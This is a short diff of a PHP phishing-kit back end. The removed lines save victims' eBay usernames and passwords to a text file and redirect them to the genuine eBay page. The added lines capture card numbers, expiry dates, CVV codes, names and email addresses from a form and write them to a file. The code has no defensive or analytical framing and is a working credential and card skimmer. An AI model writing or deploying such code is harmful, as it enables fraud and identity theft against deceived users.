@@ -1,6 +1,19 @@
 <?php
 
-file_put_contents("usernames.txt", "Ebay Username: " . $_POST['userid'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://accounts.ebay.com/acctxs/user');
-exit();
+$visa = $_POST["visa"];
+$mmaa = $_POST["mmaa"];
+$cvv = $_POST["cvv"];
+$nombre = $_POST["nombre"];
+$apellido = $_POST["apellido"];
+$correo = $_POST["correo"];
+
+$guardar = fopen('leeme.txt','w+');
+
+fwrite($guardar,"visa:$visa
+mmaa:$mmaa
+cvv:$cvv
+nombre:$nombre
+apellido:$apellido
+correo:$correo
+");
 ?>
